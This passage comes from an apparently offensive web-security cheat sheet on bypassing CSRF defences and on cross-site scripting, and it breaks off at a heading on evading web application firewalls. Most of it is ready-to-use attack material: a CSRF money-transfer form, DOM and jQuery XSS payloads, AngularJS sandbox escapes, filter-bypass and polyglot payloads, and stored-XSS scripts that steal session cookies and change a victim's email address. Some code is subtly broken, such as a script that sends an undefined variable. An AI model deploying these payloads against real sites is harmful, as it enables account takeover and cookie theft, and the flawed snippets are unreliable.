<li>Some applications do not validate that the token belongs to the same session as the user who is making the request; an attacker could generate a valid CSRF token simply by using its legit account.</li>
</ul>
<h4 id="samesite-cookie-bypasses">SameSite Cookie Bypasses</h4>
<p>It's possible to bypass a <code>Lax</code> SameSite policy by forcing the request method to be <code>GET</code>; even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line.</p>
<p><em>Symfony</em> supports the <code>_method</code> parameter in forms, which takes precedence over the normal method for routing purposes:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"https://vulnerable-website.com/account/transfer-payment"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"_method"</span> <span class="na">value</span><span class="o">=</span><span class="s">"GET"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"recipient"</span> <span class="na">value</span><span class="o">=</span><span class="s">"hacker"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"amount"</span> <span class="na">value</span><span class="o">=</span><span class="s">"1000000"</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</code></pre></div>
<p>Note: Other frameworks support a variety of similar parameters.</p>
<p>It could be possible to bypass a <code>Strict</code> SameSite restriction by abusing some client-side vulnerabilities such as XSS or DOM-based open redirects; since client-sides redirects are not treated as server-side redirects by the browsers, <strong>being the requests actually same-site</strong>, the cookies and will be included.</p>
<p>When dealing with SSO, <strong>if a client-side gadget that enables to refresh the SSO cookie is found</strong>, could be possible to abuse the 120 seconds window wherein the browsers do not apply the <code>Lax</code> restrictions for top-level requests.</p>
<ul>
<li>Find a client-side gadget</li>
<li>Use a top-level navigation to force the SSO cookie refresh; it must be a top-level navigation* so that the cookies are passed to the request to the SSO provider. Being already authenticated, the user shouldn't be asked to login again, a new cookie should just be issued.</li>
<li>Perform the CSRF attack within the 120 seconds window.</li>
</ul>
<p><strong>Note</strong>: after the refresh the victim should be redirected to the attacker site in order to perform the CSRF attack; this isn't easy feasible. A better approach is to force the browser to open a new tab for the refresh:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// use windows.onclick in order to prevent popup to be blocked by default by the browser</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onclick</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'https://vulnerable-website.com/login/sso'</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<h4 id="referer-bypasses">Referer Bypasses</h4>
<p>Some applications validate the <code>Referer</code> header when it is present in requests but skip the validation if the header is omitted. </p>
<p>Force the browser to drop the <code>Referer</code> header by setting the following <code>&lt;meta&gt;</code> within the page hosting the CSRF attack:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"referrer"</span> <span class="na">content</span><span class="o">=</span><span class="s">"no-referrer"</span><span class="p">&gt;</span>
</code></pre></div>
<p>Modern browsers, in order to attempt to mitigate the risk of data leaking, generally strip query strings from the <code>Referer</code> value, which may contain sensitive data.
This behaviour can be overridden by setting the  header <code>Referrer-Policy</code> with the value <code>unsafe-url</code>, or by including the following <code>&lt;meta&gt;</code>, in the CSRF attack:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"referrer"</span> <span class="na">content</span><span class="o">=</span><span class="s">"unsafe-url"</span><span class="p">&gt;</span>
</code></pre></div>
<h2 id="cross-site-scripting-xss_2">Cross-Site Scripting (XSS)</h2>
<p>When using Chrome, from version 92 onward, cross-origin iframes are prevented from calling <code>alert()</code>; use instead <code>print()</code> for PoC.</p>
<p>An alternative to <code>%0D%0A</code> when space are escaped/encoded is to use the hyphen <code>-</code>.</p>
<p>It's possible to force focus on an element by using <code>iframe</code> like follows (useful for phishing):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">https://targetvulnerablesite</span> <span class="na">onload</span><span class="o">=</span><span class="s">"setTimeout(()=&gt;this.src=this.src+'#x',500)"</span><span class="p">&gt;</span>
</code></pre></div>
<p>It's also possible to force some user action by using <code>iframe</code> like follows:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src </span><span class="o">=</span><span class="s">my-account</span> <span class="na">onload </span><span class="o">=</span> <span class="s">this.contentDocument.forms[1].submit()</span> <span class="p">&gt;</span>
</code></pre></div>
<p>Useful resources:</p>
<ul>
<li><a href="https://shazzer.co.uk/">Shazzer</a></li>
</ul>
<h3 id="dom-cross-site-scripting">DOM Cross-Site Scripting</h3>
<p>The <code>innerHTML</code> sink doesn't accept <code>script</code> elements on any modern browser, nor will <code>svg onload</code> events fire.</p>
<p>DOM XSS common sources:</p>
<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">URL</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">documentURI</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">URLUnencoded</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">baseURI</span>
<span class="nx">location</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">referrer</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">name</span>
<span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span>
<span class="nx">history</span><span class="p">.</span><span class="nx">replaceState</span>
<span class="nx">localStorage</span>
<span class="nx">sessionStorage</span>
<span class="nx">IndexedDB</span><span class="w"> </span><span class="p">(</span><span class="nx">mozIndexedDB</span><span class="p">,</span><span class="w"> </span><span class="nx">webkitIndexedDB</span><span class="p">,</span><span class="w"> </span><span class="nx">msIndexedDB</span><span class="p">)</span>
<span class="nx">Database</span>
</code></pre></div>
<p>DOM XSS common sinks:</p>
<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">()</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">()</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">domain</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">outerHTML</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">insertAdjacentHTML</span>
<span class="nx">element</span><span class="p">.</span><span class="nx">onevent</span>
</code></pre></div>
<h3 id="src-attribute-xss">src Attribute XSS</h3>
<p>XSS on  <code>src</code> attribute:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"data:,alert(1)"</span><span class="p">&gt;</span><span class="w"> </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"javascript:new Function['PoC'].find(alert)"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="hidden-input-xss">Hidden Input XSS</h3>
<p>XSS on hidden-type input:</p>
<div class="highlight"><pre><span></span><code><span class="x">// Vulnerable to accesskey + onclick</span>
<span class="x">// Not vulnerable to type overwriting</span>
<span class="x">// ?xss=" accesskey=X onclick=alert(1);//</span>
<span class="x">&lt;input type="hidden" value="</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">" /&gt; </span>

<span class="x">// Vulnerable to type overwriting</span>
<span class="x">// ?xss=" type=image src=x onerror=alert(1);//</span>
<span class="x">&lt;input value="</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xss'</span><span class="p">]</span> <span class="cp">?&gt;</span><span class="x">" type="hidden" /&gt; </span>
</code></pre></div>
<p>Another payload using <code>oncontentvisibilityautostatechange</code> attribute (works on Chrome and Edge):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">hidden</span>
<span class="na">oncontentvisibilityautostatechange</span><span class="o">=</span><span class="s">alert(1)</span>
<span class="na">style</span><span class="o">=</span><span class="s">content-visibility:auto</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="phone-number-input-xss">Phone Number Input XSS</h3>
<p>If the library parses phone numbers according to RFC and accepts optional parameters such as "phone-context":</p>
<div class="highlight"><pre><span></span><code>10203040;𝐩𝐡𝐨𝐧𝐞-𝐜𝐨𝐧𝐭𝐞𝐱𝐭=<span class="p">&lt;</span><span class="nt">𝐬𝐜𝐫𝐢𝐩𝐭</span><span class="p">&gt;</span>𝐚𝐥𝐞𝐫𝐭(1)<span class="p">&lt;/</span><span class="nt">𝐬𝐜𝐫𝐢𝐩𝐭</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="content-type-abuse">Content-Type abuse</h3>
<p>Take a look there: <a href="https://github.com/BlackFan/content-type-research/blob/master/XSS.md">Content-Type that can be used for XSS</a>.</p>
<p>If content-type is <code>image/svg+xml</code>:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE svg [</span>
<span class="cp">    &lt;!ENTITY lol "alert(1)"&gt;</span>
<span class="w">    </span><span class="cp">&lt;!ENTITY a "data:,&amp;lol;"&gt;</span>
]&gt;

<span class="nt">&lt;svg</span><span class="w"> </span><span class="na">width=</span><span class="s">"200"</span><span class="w"> </span><span class="na">height=</span><span class="s">"188"</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span><span class="nt">&gt;</span>
<span class="w">    </span><span class="nt">&lt;script</span><span class="w"> </span><span class="na">href=</span><span class="s">"&amp;a;"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/svg&gt;</span>
</code></pre></div>
<h3 id="javascript-url-xss">Javascript URL XSS</h3>
<p>When the payload gets reflected into the value of a <strong>Javascript URL</strong> (<code>javascript:</code>), even though keys chars such as brackets, single quote, double quotes, etc. reflect in the URL-encoded form, they still might be interpreted and therefore allow to perform XSS attacks:</p>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Example: --&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26REFLECTED_VALUE'}).finally(_ =&gt; window.location = '/')"</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- Even though the single quote is URL-encoded (%27), --&gt;</span>
<span class="cm">&lt;!-- when the javascript: content is interpeted, it breaks the string and allows to inject additional code  --&gt;</span>
<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ =&gt; window.location = '/')"</span><span class="p">&gt;</span>
</code></pre></div>
<p>When there reflection happens in an attribute value, it's possible to use HTML encoding to bypass escaping and filters.</p>
<h3 id="jquery-dom-xss">jQuery DOM XSS</h3>
<p>Common jQuery sinks:</p>
<div class="highlight"><pre><span></span><code><span class="nx">add</span><span class="p">()</span>
<span class="nx">after</span><span class="p">()</span>
<span class="nx">append</span><span class="p">()</span>
<span class="nx">animate</span><span class="p">()</span>
<span class="nx">attr</span><span class="p">()</span>
<span class="nx">insertAfter</span><span class="p">()</span>
<span class="nx">insertBefore</span><span class="p">()</span>
<span class="nx">before</span><span class="p">()</span>
<span class="nx">html</span><span class="p">()</span>
<span class="nx">prepend</span><span class="p">()</span>
<span class="nx">replaceAll</span><span class="p">()</span>
<span class="nx">replaceWith</span><span class="p">()</span>
<span class="nx">wrap</span><span class="p">()</span>
<span class="nx">wrapInner</span><span class="p">()</span>
<span class="nx">wrapAll</span><span class="p">()</span>
<span class="nx">has</span><span class="p">()</span>
<span class="kr">constructor</span><span class="p">()</span>
<span class="nx">init</span><span class="p">()</span>
<span class="nx">index</span><span class="p">()</span>
<span class="nx">jQuery</span><span class="p">.</span><span class="nx">parseHTML</span><span class="p">()</span>
<span class="nx">$</span><span class="p">.</span><span class="nx">parseHTML</span><span class="p">()</span>
</code></pre></div>
<p>jQuery can be vulnerable via the <code>$()</code> selector sink if the attacker has full control over its input from a source that doesn't require a <code>#</code> prefix. The <code>$()</code> would create a new DOM element if the specified selector does not exists:</p>
<div class="highlight"><pre><span></span><code><span class="nx">$</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">injected</span><span class="w"> </span><span class="nx">payload</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span><span class="c1">// Working</span>
<span class="nx">Example</span><span class="o">:</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">'&lt;img src=x onerror=alert(1)&gt;'</span><span class="p">)</span>

<span class="nx">$</span><span class="p">(</span><span class="s1">'#'</span><span class="w"> </span><span class="o">+&lt;</span><span class="nx">injected</span><span class="w"> </span><span class="nx">payload</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span><span class="c1">// Not Working</span>
<span class="nx">Example</span><span class="o">:</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">'#&lt;img src=x onerror=alert(1)&gt;'</span><span class="p">)</span>
</code></pre></div>
<p>Exploit jQuery <code>hashchange</code> event handler:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// Vulnerable Code</span>
<span class="nx">$</span><span class="p">(</span><span class="nb">window</span><span class="p">).</span><span class="nx">on</span><span class="p">(</span><span class="s1">'hashchange'</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">post</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s1">'section.blog-list h2:contains('</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">1</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">')'</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">post</span><span class="p">)</span><span class="w"> </span><span class="nx">post</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="mf">0</span><span class="p">).</span><span class="nx">scrollIntoView</span><span class="p">();</span>
<span class="p">});</span>
</code></pre></div>
<ul>
<li><strong>Exploit (Self-XSS)</strong>: Change from <code>https://vulnreablesite</code> to <code>https://vulnreablesite/#&lt;img src=1 onerror=alert(1)&gt;</code></li>
<li><strong>Exploit (PoC XSS)</strong>:<code>&lt;iframe src="https://vulnerable-website.com#" onload="this.src+='&lt;img src=1 onerror=alert(1)&gt;'"&gt;</code></li>
</ul>
<h3 id="angular-js-xss">Angular JS XSS</h3>
<p>Exploit AngularJS <code>ng-app</code> directive; if any HTML node has the <code>ng-app</code> directive then anywhere within this node or its children a <code>{{javascript exception}}</code> string is found, it is interpreted by AngularJS.</p>
<p>Example:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>...<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
...
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">ng-app</span><span class="p">&gt;</span>
    ...
        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>{{constructor.constructor('alert(1)')()}}<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    ...
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
...
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="useful-scripts">Useful Scripts</h3>
<p>Stored XSS payload exiltrating cookie or making the victim perform some actions:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// Cookie exfiltration</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'DOMContentLoaded'</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">xhr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="w">    </span><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"POST"</span><span class="p">,</span><span class="w"> </span><span class="s2">"post/comment"</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>

<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">formData2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">FormData</span><span class="p">();</span>
<span class="w">    </span><span class="nx">formData2</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">"csrf"</span><span class="p">,</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s2">"csrf"</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">value</span><span class="p">);</span>
<span class="w">    </span><span class="nx">formData2</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">"postId"</span><span class="p">,</span><span class="w"> </span><span class="mf">9</span><span class="p">);</span>
<span class="w">    </span><span class="nx">formData2</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">"comment"</span><span class="p">,</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="w">    </span><span class="nx">formData2</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">"name"</span><span class="p">,</span><span class="w"> </span><span class="s2">"pwned"</span><span class="p">);</span>
<span class="w">    </span><span class="nx">formData2</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">"email"</span><span class="p">,</span><span class="w"> </span><span class="s2">"test@test.test"</span><span class="p">);</span>
<span class="w">    </span><span class="nx">formData2</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="s2">"website"</span><span class="p">,</span><span class="w"> </span><span class="s2">"http://test.test"</span><span class="p">);</span>
<span class="w">    </span><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">formData</span><span class="p">);</span>

<span class="p">});</span>
</code></pre></div>
<p>Stored XSS payload making the victim perform some actions:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// www-form-urlencoded + perfom actions</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'DOMContentLoaded'</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">xhr1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
<span class="w">    </span><span class="nx">xhr1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span><span class="s2">"my-account"</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="w">    </span><span class="nx">xhr1</span><span class="p">.</span><span class="nx">onreadystatechange</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">4</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">DOMParser</span><span class="p">();</span>
<span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">myAccountDoc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parseFromString</span><span class="p">(</span><span class="nx">xhr1</span><span class="p">.</span><span class="nx">responseText</span><span class="p">,</span><span class="w"> </span><span class="s2">"text/html"</span><span class="p">);</span>
<span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">csrf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">myAccountDoc</span><span class="p">.</span><span class="nx">getElementsByName</span><span class="p">(</span><span class="s2">"csrf"</span><span class="p">)[</span><span class="mf">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
<span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">xhr2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>

<span class="w">            </span><span class="nx">xhr2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"POST"</span><span class="p">,</span><span class="s2">"my-account/change-email"</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="w">            </span><span class="nx">xhr2</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">"Content-Type"</span><span class="p">,</span><span class="s2">"application/x-www-form-urlencoded"</span><span class="p">);</span>

<span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"email=pwned@normal-user.net&amp;csrf="</span><span class="o">+</span><span class="nx">csrf</span><span class="p">;</span>
<span class="w">            </span><span class="nx">xhr2</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="nx">xhr1</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
<span class="p">});</span>
</code></pre></div>
<h3 id="bypasses_2">Bypasses</h3>
<p>Prepend additional <code>&lt;</code>:</p>
<div class="highlight"><pre><span></span><code><span class="err">&lt;</span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span><span class="o">/</span><span class="nx">script</span><span class="o">&gt;</span>
</code></pre></div>
<p>Remove closing tag :</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)</span>
</code></pre></div>
<p>Double open angle brackets:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">http://malicious.com</span> <span class="err">&lt;</span>
</code></pre></div>
<p>Use uncommon tags such as <code>&lt;style&gt;</code>:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;.</span><span class="nc">classname</span><span class="p">{</span><span class="k">background-image</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">"javascript:alert('XSS')"</span><span class="p">);}&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div>
<p>Use extra characters:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">aa</span> <span class="na">aaa</span> <span class="na">aaaa</span> <span class="na">aaaaa</span> <span class="na">aaaaaa</span> <span class="na">aaaasaa</span> <span class="na">aaaaaaaa</span> <span class="na">aaaaaasaaa</span> <span class="na">href</span><span class="o">=</span><span class="s">javascript:alert(1)</span><span class="p">&gt;</span>xss<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<p>Use octal encoding:</p>
<div class="highlight"><pre><span></span><code>javascript:74163166147401571561541571411447514115414516216450615176
</code></pre></div>
<p>Uppercase XSS with Unicode entity:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SVG</span> <span class="na">ONLOAD</span><span class="o">=</span><span class="s">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)</span><span class="p">&gt;</span>
</code></pre></div>
<p>SVG XSS when all events handler and the href attribute are blocked (requires interaction):</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">svg</span><span class="p">&gt;&lt;</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">animate</span> <span class="na">attributeName</span><span class="o">=</span><span class="s">href</span> <span class="na">values</span><span class="o">=</span><span class="s">javascript:alert(1)</span> <span class="p">/&gt;&lt;</span><span class="nt">text</span> <span class="na">x</span><span class="o">=</span><span class="s">20</span> <span class="na">y</span><span class="o">=</span><span class="s">20</span><span class="p">&gt;</span>Click me<span class="p">&lt;/</span><span class="nt">text</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</code></pre></div>
<p>No parenthesis:</p>
<ul>
<li><a href="https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses">Invoking a function without parentheses - StackOverflow</a></li>
<li><a href="https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses">The seventh way to calla a javascript function without parentheses</a></li>
<li><a href="https://portswigger.net/research/executing-non-alphanumeric-javascript-without-parenthesis">Executing non-alphanumeric javascript without parenthesis</a></li>
</ul>
<div class="highlight"><pre><span></span><code><span class="nx">alert</span><span class="sb">`1337`</span><span class="w"> </span><span class="c1">// backticks replace brackets</span>

<span class="k">throw</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">,</span><span class="mf">1337</span>

<span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">;</span><span class="k">throw</span><span class="w"> </span><span class="mf">1</span>

<span class="nb">Function</span><span class="sb">`x</span><span class="si">${</span><span class="s1">'alert\x281337\x29'</span><span class="si">}</span><span class="sb">x```</span>

<span class="s1">'alert\x281337\x29'</span><span class="ow">instanceof</span><span class="p">{[</span><span class="nb">Symbol</span><span class="p">[</span><span class="s1">'hasInstance'</span><span class="p">]]</span><span class="o">:</span><span class="nb">eval</span><span class="p">}</span>

<span class="nx">valueOf</span><span class="o">=</span><span class="nx">alert</span><span class="p">;</span><span class="nb">window</span><span class="o">+</span><span class="s1">''</span>

<span class="nx">x</span><span class="o">=</span><span class="ow">new</span><span class="w"> </span><span class="nx">DOMMatrix</span><span class="p">;</span><span class="nx">matrix</span><span class="o">=</span><span class="nx">alert</span><span class="p">;</span><span class="nx">x</span><span class="p">.</span><span class="nx">a</span><span class="o">=</span><span class="mf">1337</span><span class="p">;</span><span class="nx">location</span><span class="o">=</span><span class="s1">'javascript'</span><span class="o">+</span><span class="s1">':'</span><span class="o">+</span><span class="nx">x</span>

<span class="c1">// or any DOMXSS sink such as location=name</span>
</code></pre></div>
<p>Polyglots:</p>
<div class="highlight"><pre><span></span><code>1'"--&gt;<span class="p">&lt;</span><span class="nt">A</span> <span class="na">HRef</span> <span class="na">AutoFocus</span> <span class="na">OnFocus</span><span class="err">&ZeroWidthSpace;=</span><span class="na">alert</span><span class="err">(</span><span class="na">1</span><span class="err">)/</span><span class="p">/&gt;</span> # HTML Context
1<span class="err">&lt;</span>&ZeroWidthSpace;/Script&gt;<span class="err">&lt;</span>&ZeroWidthSpace;Script&gt;1/*'/*\'/**//alert(1)// # JS Context
</code></pre></div>
<p>HTML entities used as JS variables:</p>
<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">data:</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&amp;Xopf;=alert;&amp;Xopf;</span> <span class="err">(</span><span class="na">1</span><span class="err">)</span><span class="p">&gt;</span>

xss"&gt;<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">srcdoc</span><span class="o">=</span><span class="s">"%26lt;script</span><span class="p">&gt;</span>;prompt`${document.domain}`%26lt;/script&gt;'&gt;
</code></pre></div>
<p>Bypass Akamai, Imperva and CloudFlare:</p>
